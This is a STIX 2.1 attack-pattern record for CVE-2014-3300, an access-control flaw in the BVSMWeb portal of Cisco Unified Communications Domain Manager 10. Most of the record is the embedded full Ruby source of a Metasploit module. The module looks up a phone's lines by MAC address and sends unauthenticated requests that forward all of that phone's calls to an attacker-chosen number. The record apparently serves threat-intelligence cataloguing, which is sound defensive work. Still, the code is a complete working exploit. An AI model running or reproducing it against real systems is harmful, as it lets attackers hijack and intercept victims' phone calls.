{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--708972da-b558-4af6-8c12-57c62f036dba",
    "created": "2024-08-14T16:31:23.735604Z",
    "modified": "2024-08-14T16:31:23.735607Z",
    "name": "Viproy CUCDM IP Phone XML Services - Call Forwarding Tool",
    "description": " The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager (CDM) 10 does not properly implement access control, which allows remote attackers to modify user information. This module exploits the vulnerability to configure unauthorized call forwarding. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/voip/cisco_cucdm_call_forward.rb",
            "external_id": "cisco_cucdm_call_forward.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-3300"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => 'Viproy CUCDM IP Phone XML Services - Call Forwarding Tool',\n      'Description' => %q{\n        The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager\n        (CDM) 10 does not properly implement access control, which allows remote attackers to\n        modify user information. This module exploits the vulnerability to configure unauthorized\n        call forwarding.\n      },\n      'Author'      => 'fozavci',\n      'References'  =>\n        [\n          ['CVE', '2014-3300'],\n          ['BID', '68331']\n        ],\n      'License'     => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'Forward', { 'Description' => 'Enabling the call forwarding for the MAC address' } ],\n          [ 'Info', { 'Description' => 'Retrieving the call forwarding information for the MAC address' } ]\n        ],\n      'DefaultAction'  => 'Info'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'Target URI for XML services', '/bvsmweb']),\n        OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),\n        OptString.new('FORWARDTO', [ true, 'Number to forward all calls', '007']),\n        OptString.new('FINTNUMBER', [ false, 'FINTNUMBER of IP Phones, required for multiple lines'])\n      ])\n  end\n\n  def run\n    case action.name.upcase\n    when 'INFO'\n      get_info\n    when 'FORWARD'\n      forward_calls\n    end\n  end\n\n  def get_info\n    uri = normalize_uri(target_uri.to_s)\n    mac = datastore[\"MAC\"]\n\n    print_status(\"Getting fintnumbers and display names of the IP phone\")\n\n    res = send_request_cgi(\n        {\n            'uri'    => normalize_uri(uri, 'showcallfwd.cgi'),\n            'method' => 'GET',\n            'vars_get' => {\n                'device' => \"SEP#{mac}\"\n            }\n        })\n\n    unless res && res.code == 200 && res.body && res.body.to_s =~ /fintnumber/\n      print_error(\"Target appears not vulnerable!\")\n      print_status(\"#{res}\")\n      return []\n    end\n\n    doc = REXML::Document.new(res.body)\n    lines = []\n    fint_numbers = []\n\n    list = doc.root.get_elements('MenuItem')\n\n    list.each do |lst|\n      xlist = lst.get_elements('Name')\n      xlist.each {|l| lines << \"#{l[0]}\"}\n      xlist = lst.get_elements('URL')\n      xlist.each {|l| fint_numbers << \"#{l[0].to_s.split('fintnumber=')[1]}\" }\n    end\n\n    lines.size.times do |i|\n      print_status(\"Display Name: #{lines[i]}, Fintnumber: #{fint_numbers[i]}\")\n    end\n\n    fint_numbers\n  end\n\n  def forward_calls\n    # for a specific FINTNUMBER redirection\n    uri = normalize_uri(target_uri.to_s)\n    forward_to = datastore[\"FORWARDTO\"]\n    mac = datastore[\"MAC\"]\n\n    if datastore['FINTNUMBER']\n      fint_numbers = [datastore['FINTNUMBER']]\n    else\n      fint_numbers = get_info\n    end\n\n    if fint_numbers.empty?\n      print_error(\"FINTNUMBER required to forward calls\")\n      return\n    end\n\n    fint_numbers.each do |fintnumber|\n\n      print_status(\"Sending call forward request for #{fintnumber}\")\n\n      send_request_cgi(\n          {\n              'uri'    => normalize_uri(uri, 'phonecallfwd.cgi'),\n              'method' => 'GET',\n              'vars_get' => {\n                  'cfoption'     => 'CallForwardAll',\n                  'device'       => \"SEP#{mac}\",\n                  'ProviderName' => 'NULL',\n                  'fintnumber'   => \"#{fintnumber}\",\n                  'telno1'       => \"#{forward_to}\"\n              }\n          })\n\n      res = send_request_cgi(\n          {\n              'uri'    => normalize_uri(uri, 'showcallfwdperline.cgi'),\n              'method' => 'GET',\n              'vars_get' => {\n                  'device'     => \"SEP#{mac}\",\n                  'fintnumber' => \"#{fintnumber}\"\n              }\n          })\n\n      if res && res.body && res.body && res.body.to_s =~ /CFA/\n        print_good(\"Call forwarded successfully for #{fintnumber}\")\n      else\n        print_error(\"Call forward failed\")\n      end\n    end\n  end\nend\n"
}